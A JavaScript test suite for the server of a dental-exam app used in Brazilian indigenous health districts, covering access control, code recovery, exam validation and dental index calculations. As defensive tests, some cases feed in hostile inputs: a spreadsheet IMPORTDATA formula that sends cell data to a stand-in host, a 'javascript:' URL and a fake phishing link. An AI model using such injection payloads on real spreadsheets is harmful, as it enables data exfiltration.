// Testes do servidor (Codigo.gs) no simulador do Apps Script. Rodam no computador (node testes/servidor.test.js)
// e no GitHub a cada envio. Não usam dados reais nem senhas reais: o cenário é montado do zero pelos fluxos do app.
const { cenario, exame } = require("./cenario.js");
let falhas = 0, total = 0, secao = "";
const T = (nome, cond, extra) => {
  total++;
  if (!cond) { falhas++; console.log("FALHA " + secao + " › " + nome + (extra === undefined ? "" : " → " + JSON.stringify(extra).slice(0, 400))); }
  else if (process.env.VERBOSO) console.log("ok    " + secao + " › " + nome);
};
const parte = n => { secao = n; };
const hojeBR = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/Sao_Paulo" }).format(new Date());
const amanhaBR = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/Sao_Paulo" }).format(new Date(Date.now() + 86400000));

const S = cenario();
const { G, P, C, RT, ANA, BRUNO, CARLA, BETO, PAULA } = S;
const aba = n => G.est.sheets[n] || [];
const col = (n, c) => aba(n)[0].indexOf(c);
const linhaEx = id => aba("Exames").find(l => l[0] === id);
const jsonEx = id => JSON.parse(linhaEx(id).at(-1));
const editouAMao = nome => G.ctx.onEdit({ range: { getSheet: () => ({ getName: () => nome }) } }); // o Google avisa cada edição feita na tela
const mailsPara = e => G.est.mails.filter(m => m.to === e);
const planilhaExtra = nome => Object.values(G.est.extras).find(x => x.nome === nome);
const bk = () => planilhaExtra("Odontograma - backup");
const URL_OFICIAL = "https://luanabrisolla-creator.github.io/odontograma-v2/";
let r;

/* ---------------------------------------------------------------- instalação */
parte("instalação");
r = G.get();
T("servidor informa a versão", r.ok && typeof r.versao === "number" && r.versao >= 28, r.versao);
T("planilha vazia foi organizada sozinha no primeiro uso", G.ctx.formatoAtual(), G.est.props.FORMATO_PLANILHA);
T("abas principais na ordem", aba("Exames").length && G.est.order.slice(0, 5).join() === "Exames,Acessos,Uso,Usuarios,Dicionário" && !G.est.sheets.Dentes, G.est.order);
T("backup feito antes da organização: uma planilha de backup, na pasta de backups", !!bk() && G.est.backups.length === 0 && !!G.est.props.BACKUP_ID && /backup/i.test(G.est.props.ULTIMO_BACKUP ? "backup" : ""), Object.values(G.est.extras).map(x => x.nome));

/* ---------------------------------------------------------------- cadastro e perfis */
parte("cadastro");
r = P(ANA, { acao: "entrar" });
T("dentista aprovada pela RT entra", r.ok && r.usuario.perfil === "dentista" && r.usuario.dsei === "Yanomami", r);
r = P(PAULA, { acao: "entrar" });
T("coordenação + RT entra como coord com DSEI", r.ok && r.usuario.perfil === "coord" && r.usuario.dsei === "Leste de Roraima", r.usuario);
r = P({ email: ANA.email, codigo: "ERRADO-0000-0000" }, { acao: "entrar" });
T("código errado é recusado", !r.ok && r.semAcesso);
r = P(null, { acao: "pedirAcesso", nome: "Novo", cro: "MT 1", email: "novo@teste.org", uf: "MT", dsei: "Xavante", perfil: "dentista" });
const idNovo = S.idDe("novo@teste.org");
r = P(RT, { acao: "aprovar", id: idNovo });
T("RT não aprova dentista de outro DSEI", !r.ok, r);
r = P(BETO, { acao: "aprovar", id: idNovo });
T("RT do DSEI aprova", r.ok, r);
r = P(null, { acao: "pedirAcesso", nome: "Zé", cro: "RR 1", email: "ze@teste.org", uf: "RR", dsei: "Teste" });
T("pedido com DSEI fora da lista é recusado", !r.ok);
r = P(null, { acao: "pedirAcesso", nome: "Zé", cro: "RR 1", email: "ze@teste.org", uf: "SP", dsei: "Yanomami" });
T("pedido com UF que não é do DSEI é recusado", !r.ok);

/* ---------------------------------------------------------------- planilha: fórmulas */
parte("planilha");
const nomeMau = '=IMPORTDATA("https://exemplo.invalido/?x="&A1)';
r = P(null, { acao: "pedirAcesso", nome: nomeMau, cro: "+5511", email: "formula@teste.org", uf: "RR", dsei: "Yanomami", polo: "@polo", perfil: "dentista" });
T("pedido de acesso com fórmula no nome é aceito como texto", r.ok, r);
const linhaF = aba("Usuarios").find(l => l[3] === "formula@teste.org");
T("nome, CRO e polo gravados com proteção (sem virar fórmula)", G.est.formulas.length === 0 && linhaF[1] === "'" + nomeMau, G.est.formulas.slice(0, 3));
const lido = G.ctx.lerUsuarios().find(u => u.email === "formula@teste.org");
T("ao ler, o nome volta igual ao digitado", lido && lido.nome === nomeMau && lido.cro === "+5511", lido && lido.nome);

/* ---------------------------------------------------------------- e-mails usam o endereço oficial */
parte("endereço dos e-mails");
const ruim = "https://site-falso.invalido/";
let n0 = G.est.mails.length;
r = G.post({ acao: "reenviarCodigo", email: ANA.email, link: ruim });
let m = G.est.mails.slice(n0).find(x => x.to === ANA.email);
T("recuperação: o link do e-mail é o oficial, mesmo se o navegador mandar outro", r.ok && m && m.body.includes(URL_OFICIAL + "?recuperar=") && !m.body.includes("site-falso"), m && m.body);
n0 = G.est.mails.length;
r = G.post({ acao: "pedirAcesso", nome: "Fulana", cro: "RR 9", email: "fulana@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista", link: ruim });
const avisos = G.est.mails.slice(n0);
T("pedido de acesso: o aviso para a RT leva o endereço oficial", avisos.length && avisos.every(x => !x.body.includes("site-falso")) && avisos.some(x => x.body.includes(URL_OFICIAL)), avisos.map(x => x.body.slice(0, 200)));
n0 = G.est.mails.length;
r = P(RT, { acao: "convidar", perfil: "dentista", emails: "convidada@teste.org", link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "convidada@teste.org");
T("convite: o link é o oficial", r.ok && m && m.body.includes(URL_OFICIAL + "?convite=") && !m.body.includes("site-falso") && r.resultados[0].link.startsWith(URL_OFICIAL), m && m.body);
n0 = G.est.mails.length;
r = P(RT, { acao: "aprovar", id: S.idDe("fulana@teste.org"), link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "fulana@teste.org");
T("aprovação: o e-mail com o código leva o endereço oficial", r.ok && m && m.body.includes(URL_OFICIAL) && !m.body.includes("site-falso"), m && m.body);
G.est.props.URL_APP = "https://odontograma.exemplo.org/app";
n0 = G.est.mails.length;
P(RT, { acao: "convidar", perfil: "dentista", emails: "outra@teste.org", link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "outra@teste.org");
T("endereço configurável em Propriedades do script (URL_APP)", m && m.body.includes("https://odontograma.exemplo.org/app/?convite="), m && m.body);
G.est.props.URL_APP = "javascript:alert(1)";
T("URL_APP inválida volta para o endereço oficial", G.ctx.urlApp() === URL_OFICIAL);
delete G.est.props.URL_APP;

/* ---------------------------------------------------------------- convite até o fim */
parte("convites");
const tokConv = (mailsPara("convidada@teste.org").at(-1).body.match(/convite=([0-9a-f]+)/) || [])[1];
r = G.post({ acao: "verConvite", convite: tokConv });
T("convite válido é reconhecido", r.ok && r.convite.dsei === "Yanomami", r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "SP" });
T("aceitar com UF de fora do DSEI é recusado", !r.ok, r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "RR" });
T("aceitar o convite cria acesso ativo", r.ok && r.usuario && r.usuario.status === "ativo", r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "RR" });
T("o mesmo convite não serve duas vezes", !r.ok);

/* ---------------------------------------------------------------- recuperação de código */
parte("recuperação");
const pedirRec = e => { G.post({ acao: "reenviarCodigo", email: e }); return (mailsPara(e).at(-1).body.match(/recuperar=([0-9a-f]+)/) || [])[1]; };
const tokB = pedirRec(BRUNO.email);
T("o pedido não troca o código: o antigo continua valendo", P(BRUNO, { acao: "entrar" }).ok);
r = G.post({ acao: "confirmarRecuperacao", recuperar: "abcdef0123456789abcdef" });
T("link inventado é recusado", !r.ok);
r = G.post({ acao: "confirmarRecuperacao", recuperar: tokB });
T("confirmar gera o código novo e mostra na tela", r.ok && /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(r.codigo), r);
const novoB = r.codigo;
T("depois de confirmar, o código antigo para de valer", !P(BRUNO, { acao: "entrar" }).ok);
BRUNO.codigo = novoB;
T("o código novo vale", P(BRUNO, { acao: "entrar" }).ok);
T("o código novo também vai por e-mail", mailsPara(BRUNO.email).some(x => x.body.includes(novoB)));
T("link já usado não serve de novo", !G.post({ acao: "confirmarRecuperacao", recuperar: tokB }).ok);
const tokV = pedirRec(BRUNO.email);
aba("_recuperacoes").forEach((l, i) => { if (i) l[4] = "2020-01-01T00:00:00.000Z"; });
r = G.post({ acao: "confirmarRecuperacao", recuperar: tokV });
T("link vencido é recusado", !r.ok && /expirou/.test(r.erro), r);
G.post({ acao: "reenviarCodigo", email: BRUNO.email });
r = G.post({ acao: "reenviarCodigo", email: BRUNO.email });
T("no máximo 3 pedidos por hora por e-mail", !r.ok && /hora/.test(r.erro), r);
n0 = G.est.mails.length;
r = G.post({ acao: "reenviarCodigo", email: "ninguem@teste.org" });
T("e-mail sem acesso: mesma resposta e nenhum e-mail enviado", r.ok && G.est.mails.length === n0);

/* ---------------------------------------------------------------- limite de tentativas */
parte("login");
for (let i = 0; i < 21; i++) P({ email: CARLA.email, codigo: "ERRADO-" + i }, { acao: "entrar" });
r = P({ email: CARLA.email, codigo: "ERRADO-X" }, { acao: "entrar" });
T("depois de 20 erros, as tentativas erradas recebem 'bloqueado'", !r.ok && r.bloqueado, r);
r = P(CARLA, { acao: "entrar" });
T("profissional com o código certo entra mesmo depois de 20 erros de outra pessoa", r.ok, r);
r = P({ email: CARLA.email, codigo: "ERRADO-Y" }, { acao: "entrar" });
T("entrar zera o contador de erros", !r.ok && !r.bloqueado, r);
for (let i = 0; i < 21; i++) P({ email: C.email, codigo: "errada-" + i }, { acao: "entrar" });
r = P(C, { acao: "entrar" });
T("coordenação titular: bloqueio vale até para a senha certa (senha escolhida por pessoa)", !r.ok && r.bloqueado, r);
Object.keys(G.est.cache).forEach(k => { if (k.includes(C.email)) G.est.cache[k].exp = 0; });
T("titular volta a entrar depois do tempo", P(C, { acao: "entrar" }).ok);
G.est.props.CHAVE_COORDENACAO = "curta123";
r = P({ email: C.email, codigo: "curta123" }, { acao: "admin" });
T("senha da titular com menos de 12 caracteres não entra, e a mensagem diz como resolver", !r.ok && /pelo menos 12 caracteres/.test(r.erro) && /Propriedades do script/.test(r.erro), r);
G.est.props.CHAVE_COORDENACAO = S.SENHA_TITULAR;
T("senha longa: sem aviso", P(C, { acao: "admin" }).senhaCurta === false);

/* ---------------------------------------------------------------- corrida no login */
parte("concorrência");
// Simula: a RT desativa a Ana no mesmo instante em que o app dela faz o primeiro acesso do dia.
const realLer = G.ctx.lerUsuarios;
const linhaAna = aba("Usuarios").findIndex(l => l[3] === ANA.email);
aba("Usuarios")[linhaAna][col("Usuarios", "ultimo_acesso")] = "2020-01-01T00:00:00.000Z";
editouAMao("Usuarios"); G.ctx.cadastrosMudaram(); // mexemos na planilha "à mão": o Google avisa e a cópia rápida é esquecida
const fotoAntiga = realLer();
aba("Usuarios")[linhaAna][col("Usuarios", "status")] = "desativado";
G.ctx.lerUsuarios = () => JSON.parse(JSON.stringify(fotoAntiga));
P(ANA, { acao: "painel" });
G.ctx.lerUsuarios = realLer;
T("o login atrasado grava só o último acesso e não desfaz a desativação", aba("Usuarios")[linhaAna][col("Usuarios", "status")] === "desativado" && aba("Usuarios")[linhaAna][col("Usuarios", "ultimo_acesso")] > "2026", aba("Usuarios")[linhaAna]);
aba("Usuarios")[linhaAna][col("Usuarios", "status")] = "ativo";

/* ---------------------------------------------------------------- exames: validação */
parte("validação do exame");
const tenta = (nome, mexe, re, cred) => {
  const e = exame(); mexe(e); const n = aba("Exames").length;
  const x = P(cred || ANA, { acao: "enviarExame", registro: e });
  T("recusa: " + nome, !x.ok && re.test(x.erro || "") && aba("Exames").length === n, x.erro || x);
};
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OK1", sufixo: "KAAAAAA2" }) });
T("exame completo é gravado", r.ok && linhaEx("OK1"), r);
tenta("sem sexo (\"Não informado\")", e => { e.crianca.sexo = ""; }, /sexo/);
tenta("sexo fora de F/M", e => { e.crianca.sexo = "NI"; }, /sexo/);
tenta("sem local de atendimento", e => { e.localAtendimento = ""; }, /local/);
tenta("sem vigilância", e => { e.vigilancia = []; }, /vigilância/);
tenta("vigilância com item fora da lista", e => { e.vigilancia = ["Coisa inventada"]; }, /vigilância/);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "VIGN", sufixo: "VGNVGNV2", vig: ["Não identificado", "Dor de dente", "Traumatismo dentoalveolar"] }) });
T("vigilância: \"Não identificado\" junto com outro item e \"Dor de dente\" sem dente com dor são corrigidos pelo servidor", r.ok && jsonEx("VIGN").vigilancia.join("|") === "Traumatismo dentoalveolar", r.ok ? jsonEx("VIGN").vigilancia : r);
tenta("placa sem resposta", e => { e.placa = null; }, /placa/);
tenta("gengivite como texto", e => { e.gengivite = "sim"; }, /gengivite/);
tenta("data impossível (31/02)", e => { e.dataExame = "2026-02-31"; }, /data do exame/);
tenta("exame de amanhã", e => { e.dataExame = amanhaBR(); }, /futuro/);
tenta("nascimento impossível", e => { e.crianca.nascimento = "2019-04-31"; }, /nascimento/);
tenta("nascimento depois do exame", e => { e.crianca.nascimento = "2026-12-01"; }, /nascimento/);
tenta("dentição inválida", e => { e.denticao = "outra"; }, /dentição/);
tenta("UF que não é do DSEI", e => { e.uf = "SP"; }, /UF/);
tenta("odontograma incompleto (faltando dentes)", e => { delete e.dentes[36]; delete e.dentes[55]; }, /incompleto/);
tenta("dente fora da dentição", e => { e.dentes[99] = e.dentes[11]; }, /fora da dentição/);
tenta("situação antiga \"a confirmar\"", e => { e.dentes[16].status = "a_confirmar"; }, /situação/);
tenta("situação antiga \"raiz residual\"", e => { e.dentes[16].status = "raiz"; }, /situação/);
tenta("situação antiga \"extração indicada\"", e => { e.dentes[16].status = "extr_ind"; }, /situação/);
tenta("esfoliado em dente permanente", e => { e.dentes[16].status = "esfoliado"; }, /situação/);
tenta("face marcada em dente que não está presente", e => { e.dentes[36].status = "ausente_carie"; e.dentes[36].faces.O = "ca"; }, /situação ou faces/);
tenta("tratamento em dente ausente", e => { e.dentes[36].status = "ausente"; e.dentes[36].procs = { art: "indicado" }; }, /tratamento/);
tenta("dor em dente não erupcionado", e => { e.dentes[17].status = "nao_erupc"; e.dentes[17].dor = true; }, /sinais/);
tenta("as duas exodontias no mesmo dente", e => { e.dentes[46].procs = { exo_carie: "indicado", exodontia: "indicado" }; }, /tratamento/);
tenta("abscesso como texto", e => { e.dentes[16].abscesso = "sim"; }, /sinais/);
tenta("prótese com resposta faltando", e => { e.protese = { sup: "nao", inf: "sim", usoSup: "nao", usoInf: "", naoAvaliado: false }; }, /prótese/);
tenta("prótese sem nenhuma resposta e sem \"não foi possível avaliar\"", e => { e.protese = { sup: "", inf: "", usoSup: "", usoInf: "" }; }, /prótese/);
tenta("prótese com valor inválido", e => { e.protese = { sup: "talvez", inf: "nao", usoSup: "nao", usoInf: "nao" }; }, /prótese/);
tenta("face com situação desconhecida", e => { e.dentes[16].faces.O = "xyz"; }, /situação/);
tenta("dor como texto", e => { e.dentes[16].dor = "sim"; }, /sinais/);
tenta("procedimento inexistente", e => { e.dentes[16].procs = { inventado: "realizado" }; }, /tratamento/);
tenta("procedimento com valor inválido", e => { e.dentes[16].procs = { selante: "feito" }; }, /tratamento/);
tenta("procedimento coletivo fora da lista", e => { e.gerais = ["Coisa inventada"]; }, /coletivos/);
tenta("insumo fora da lista", e => { e.insumos = ["Bala"]; }, /insumos/);
tenta("código de acompanhamento fora do formato", e => { e.codigo = e.codigoIndividuo = "QUALQUER-COISA"; }, /formato/);
tenta("código com a UF de outro DSEI", e => { e.codigo = e.codigoIndividuo = "SP-SUR-SAU-ABCDEFGH"; }, /UF do DSEI/);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OK2", sufixo: "KBBBBBB2", data: hojeBR(), gerais: ["Escovação supervisionada"], insumos: ["Escova dental"], mud: { 16: { procs: { selante: "realizado", verniz: "indicado" } } } }) });
T("exame de hoje, com procedimentos, coletivos e insumos válidos, passa", r.ok, r);
tenta("código no formato antigo (UF-polo-aldeia-CRO-sequência)", e => { e.codigo = e.codigoIndividuo = "RR-SUR-SAU-4471-0007"; }, /formato/);
tenta("código com a parte do polo vazia", e => { e.codigo = e.codigoIndividuo = "RR--SAU-KCCCCCC2"; }, /formato/);
tenta("código com mais de 3 caracteres na aldeia", e => { e.codigo = e.codigoIndividuo = "RR-SUR-SAUB-KCCCCCC2"; }, /formato/);
T("reserva também recusa parte vazia", !P(ANA, { acao: "reservarCodigo", codigoReserva: "RR-SUR--KCCCCCC2", exameId: "RVZ" }).ok);
T("planilha: código que bate com o local do exame → codigo_confere_local = sim", linhaEx("OK1")[col("Exames", "codigo_confere_local")] === "sim", linhaEx("OK1")[col("Exames", "codigo_confere_local")]);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OKLOC", codigo: "RR-SUR-HAK-KDDDDDD2", aldeia: "Saúba" }) });
T("código que não bate com a aldeia do exame é aceito, mas sinalizado (codigo_confere_local = não)", r.ok && linhaEx("OKLOC")[col("Exames", "codigo_confere_local")] === "não", r);
T("o dicionário da planilha explica a coluna codigo_confere_local", aba("Dicionário").some(l => l[1] === "codigo_confere_local") || Object.keys(G.est.sheets).some(n => /icion/.test(n) && G.est.sheets[n].some(l => l.includes("codigo_confere_local"))));

/* ---------------------------------------------------------------- exames: DSEI */
parte("DSEI");
tenta("CD manda exame de outro DSEI", e => { e.dsei = "Leste de Roraima"; }, /DSEI Yanomami/);
tenta("RT manda exame de outro DSEI", e => { e.dsei = "Yanomami"; e.uf = "RR"; }, /DSEI Xavante/, BETO);
tenta("coordenação + RT manda exame fora do DSEI de RT", e => { e.dsei = "Yanomami"; }, /Leste de Roraima/, PAULA);
r = P(PAULA, { acao: "enviarExame", registro: exame({ id: "PAULA1", dsei: "Leste de Roraima", sufixo: "PAVXAAA2", aldeia: "Maturuca", polo: "Surumu" }) });
T("coordenação + RT grava no próprio DSEI de RT", r.ok, r);
T("coordenação titular não registra exame", !P(C, { acao: "enviarExame", registro: exame({ dsei: "Yanomami" }) }).ok);

/* ---------------------------------------------------------------- resultado calculado no servidor */
parte("índices");
// 16, 26: exodontia devido à cárie (permanente) → C. 36: extraído por cárie → P. 46: cárie + restauração → C (uma vez).
// 55, 64: exodontia devido à cárie (decíduo) → e. 54: decíduo extraído por cárie → não conta. 53: esfoliado → não conta.
// 75: restaurada + mancha branca → o. 85: exodontia por outros motivos → não conta.
const fr = exame({ id: "IDX1", sufixo: "NDCESAB2", mud: { 16: { procs: { exo_carie: "indicado" } }, 26: { procs: { exo_carie: "realizado" }, faces: { O: "ca" } }, 36: { status: "ausente_carie" },
  46: { faces: { O: "ca", M: "rest" } }, 55: { procs: { exo_carie: "indicado" }, faces: { O: "ca" } }, 64: { procs: { exo_carie: "realizado" } }, 54: { status: "ausente_carie" }, 53: { status: "esfoliado" },
  75: { faces: { O: "rest", V: "mba" } }, 85: { procs: { exodontia: "indicado" } } } });
fr.resultado = { classe: "A", ceod: { c: 0, e: 0, o: 0, total: 0 }, cpod: { c: 0, p: 0, o: 0, total: 0 } };
r = P(ANA, { acao: "enviarExame", registro: fr });
const g = r.ok ? jsonEx("IDX1").resultado : { ceod: {}, cpod: {} };
T("o servidor ignora a classe mandada pelo navegador", r.ok && g.classe === "E", r.ok ? g.classe : r);
T("CPO-D: exodontia devido à cárie (indicada ou realizada) conta como C, uma vez por dente", g.cpod.c === 3, g.cpod);
T("CPO-D: só o extraído por cárie entra em P", g.cpod.p === 1 && g.cpod.total === 4, g.cpod);
T("ceo-d: exodontia devido à cárie (indicada ou realizada) entra em e, uma vez por dente", g.ceod.e === 2 && g.ceod.c === 0, g.ceod);
T("ceo-d: decíduo extraído por cárie, esfoliado e exodontia por outros motivos não contam", g.ceod.total === 3, g.ceod);
T("ceo-d: mancha branca com restauração conta como o", g.ceod.o === 1, g.ceod);
// Arquivo de análise (uma linha por exame, com cada dente): montado a partir do exame completo gravado.
const an = id => { const l = G.ctx.linhaAnalise(jsonEx(id)), o = {}; G.ctx.CAB_ANALISE.forEach((k, i) => o[k] = l[i]); return o; };
const a1 = r.ok ? an("IDX1") : {};
T("análise: dente esfoliado aparece como esfoliado, sem faces", a1.d53_situacao === "esfoliado" && a1.d53_face_I === "", [a1.d53_situacao, a1.d53_face_I]);
T("análise: exodontia devido à cárie em tratamento indicado do dente", a1.d16_trat_indicado === "Exodontia devido à cárie", a1.d16_trat_indicado);
T("análise: face restaurada aparece como \"restaurada sem cárie\"", a1.d46_face_M === "restaurada sem cárie" && a1.d46_face_O === "cárie ativa", [a1.d46_face_M, a1.d46_face_O]);
T("análise: contas prontas batem com os dentes", a1.n_exo_carie_indicado === 2 && a1.n_exo_carie_realizado === 2 && a1.n_dentes_extraidos_carie === 2 && a1.n_dentes_esfoliados === 1, [a1.n_exo_carie_indicado, a1.n_exo_carie_realizado, a1.n_dentes_extraidos_carie]);
T("análise: faces L ou P conforme a arcada e O ou I conforme o dente", "d16_face_P" in a1 && "d46_face_L" in a1 && "d11_face_I" in a1 && "d55_face_P" in a1 && "d85_face_L" in a1);
T("planilha: uma linha por exame (sem aba Dentes) e contas prontas nas colunas", !G.est.sheets.Dentes && linhaEx("IDX1")[col("Exames", "n_exo_carie_indicado")] === 2, linhaEx("IDX1")[col("Exames", "n_exo_carie_indicado")]);
// Dor e abscesso separados; a vigilância vem dos dentes (o servidor confere).
const fx = exame({ id: "IDX2", sufixo: "NDCESAB3", vig: ["Não identificado"], mud: { 46: { dor: true }, 36: { abscesso: true } } });
r = P(ANA, { acao: "enviarExame", registro: fx });
const jx = r.ok ? jsonEx("IDX2") : {};
T("dor e abscesso no dente levam à classe F", r.ok && jx.resultado.classe === "F", r.ok ? jx.resultado : r);
T("a vigilância gravada traz \"Dor de dente\" e \"Abscesso dentoalveolar\" vindos dos dentes, sem \"Não identificado\"", r.ok && jx.vigilancia.join("|") === "Dor de dente|Abscesso dentoalveolar", jx.vigilancia);
const a2 = r.ok ? an("IDX2") : {};
T("análise: dor e abscesso separados em cada dente", a2.d46_dor === "sim" && a2.d46_abscesso === "não" && a2.d36_abscesso === "sim" && a2.n_dentes_dor === 1 && a2.n_dentes_abscesso_fistula === 1, [a2.d46_dor, a2.d46_abscesso, a2.d36_abscesso]);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "IDX3", sufixo: "NDCESAB4", protese: { sup: "", inf: "", usoSup: "", usoInf: "", naoAvaliado: true } }) });
T("prótese \"não foi possível avaliar\" é aceita e vai como Não avaliado", r.ok && linhaEx("IDX3")[col("Exames", "protese_sup_usa")] === "não avaliado" && linhaEx("IDX3")[col("Exames", "protese_inf_necessita")] === "não avaliado", r);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "IDX4", sufixo: "NDCESAB5", protese: { sup: "sim", inf: "nao", usoSup: "nao", usoInf: "sim", naoAvaliado: false } }) });
T("prótese: necessidade e uso por arcada nas colunas certas", r.ok && linhaEx("IDX4")[col("Exames", "protese_sup_necessita")] === "sim" && linhaEx("IDX4")[col("Exames", "protese_sup_usa")] === "não" && linhaEx("IDX4")[col("Exames", "protese_inf_usa")] === "sim", r);
T("divergência de classe registrada nos Acessos", aba("Acessos").some(l => l[7] === "Resultado recalculado"));

/* ---------------------------------------------------------------- código de acompanhamento */
parte("código");
r = P(ANA, { acao: "reservarCodigo", codigoReserva: "RR-SUR-HAK-RESERVA2", exameId: "RES1" });
T("reserva um código livre", r.ok && r.reservado, r);
r = P(BRUNO, { acao: "reservarCodigo", codigoReserva: "RR-SUR-HAK-RESERVA2", exameId: "RES2" });
T("outro aparelho não recebe o mesmo código", r.ok && r.ocupado, r);
r = P(BRUNO, { acao: "reservarCodigo", codigoReserva: "RR-SUR-SAU-KAAAAAA2", exameId: "RES3" });
T("código já usado por uma pessoa não é reservado", r.ok && r.ocupado, r);
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "COL1", codigo: "RR-SUR-SAU-KAAAAAA2" }) });
T("código repetido no envio: recusado, sem '-2' e sem juntar pessoas", !r.ok && r.codigoRepetido && !linhaEx("COL1"), r);
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "COL2", codigo: "RR-SUR-HAK-RESERVA2" }) });
T("código reservado por outro exame: recusado", !r.ok && r.codigoRepetido, r);

/* ---------------------------------------------------------------- mesma pessoa, buscas e histórico */
parte("acompanhamento");
const seg = exame({ id: "OK1-B", data: "2026-10-15", vinculo: { codigoIndividuo: "RR-SUR-SAU-KAAAAAA2", chaves: [] } });
r = P(BRUNO, { acao: "enviarExame", registro: seg });
T("2º exame da mesma pessoa, por outro dentista do DSEI", r.ok && r.numeroExame === 2 && r.codigoIndividuo === "RR-SUR-SAU-KAAAAAA2", r);
r = P(BRUNO, { acao: "buscarCodigo", codigoBusca: "rr-sur-sau-kaaaaaa2", dsei: "Yanomami" });
T("busca pelo código acha a pessoa", r.ok && r.pessoa && r.pessoa.exames === 2, r);
r = P(CARLA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Yanomami" });
T("CD de outro DSEI não escolhe o DSEI da busca", r.ok && !r.pessoa && r.foraDoDsei === "Leste de Roraima", r);
r = P(CARLA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Leste de Roraima" });
T("para CD, código de outro DSEI é só 'não localizado no seu DSEI'", r.ok && !r.pessoa && !r.outroDsei && r.foraDoSeuDsei, r);
r = P(C, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Leste de Roraima" });
T("a coordenação vê qual é o DSEI do código", r.ok && r.outroDsei === "Yanomami", r);
r = P(BRUNO, { acao: "buscarPessoa", dsei: "Yanomami", aldeia: "Hakoma", nascimento: "2018-05-12", sexo: "F" });
T("busca sem código sugere pessoa de outra aldeia do DSEI, marcada", r.ok && r.outrasAldeias && r.candidatos.length && r.candidatos.every(c => c.outraAldeia), r.candidatos && r.candidatos.map(c => c.outraAldeia));
T("histórico: dentista do mesmo DSEI vê (continuidade do cuidado)", P(BRUNO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: dentista de outro DSEI não vê", !P(CARLA, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: RT de outro DSEI não vê", !P(BETO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: coordenação vê", P(C, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);

/* ---------------------------------------------------------------- código em mais de um DSEI (defesa) */
parte("código em dois DSEIs");
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "MD1", sufixo: "MDMDMDM2" }) });
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "MD2", data: "2026-10-12", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }) });
T("pessoa com dois exames no mesmo DSEI", r.ok && r.numeroExame === 2, r);
// Simula um dado corrompido: um dos exames aparece em outro DSEI na planilha.
(() => { const l = linhaEx("MD2"), j = JSON.parse(l.at(-1)); j.dsei = "Leste de Roraima"; l[col("Exames", "dsei")] = "Leste de Roraima"; l[l.length - 1] = JSON.stringify(j); })();
editouAMao("Exames");
const mails0 = mailsPara("coord@teste.org").length;
r = P(BRUNO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-MDMDMDM2" });
T("CD do DSEI não vê o histórico de código com exames em dois DSEIs", !r.ok, r);
T("fica registrado em Acessos como Segurança", aba("Acessos").some(l => l[7] === "Código em mais de um DSEI" && l[6] === "Segurança"));
T("a coordenação recebe um e-mail de aviso", mailsPara("coord@teste.org").length === mails0 + 1 && /mais de um DSEI/.test(mailsPara("coord@teste.org").at(-1).subject), mailsPara("coord@teste.org").length - mails0);
r = P(ANA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-MDMDMDM2", dsei: "Yanomami" });
T("a busca pelo código não devolve a pessoa para CD", r.ok && !r.pessoa && r.foraDoSeuDsei, r);
T("nova tentativa não manda outro e-mail (no máximo um aviso a cada 6 h)", mailsPara("coord@teste.org").length === mails0 + 1);
r = P(C, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-MDMDMDM2" });
T("a coordenação continua vendo, para corrigir", r.ok && r.exames.length === 2, r);
r = P(C, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-MDMDMDM2", dsei: "Yanomami" });
T("para a coordenação, a busca diz que o código está em conferência", r.ok && r.emConferencia && /Leste de Roraima/.test(r.outroDsei), r);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "MD3", data: "2026-10-14", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }) });
T("não dá para juntar novo exame a esse código", !r.ok && r.vinculoInvalido && !linhaEx("MD3"), r);
const md2 = Object.assign(exame({ id: "MD2", data: "2026-10-12", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }), { atualizadoEm: "2026-10-20T12:00:00.000Z" });
r = P(BRUNO, { acao: "enviarExame", registro: md2 });
T("exame gravado num DSEI não pode ser reenviado como de outro DSEI", !r.ok && r.dseiInvalido && linhaEx("MD2")[col("Exames", "dsei")] === "Leste de Roraima", r);

/* ---------------------------------------------------------------- painel */
parte("painel");
for (let i = 0; i < 6; i++) P(BRUNO, { acao: "enviarExame", registro: exame({ id: "PN" + i, sufixo: "PANEX" + "ABCDEF"[i] + "22", nasc: "2016-0" + (i + 1) + "-10", idade: 10, mud: i < 3 ? { 46: { faces: { O: "ca" } } } : {} }) });
r = P(C, { acao: "painel" });
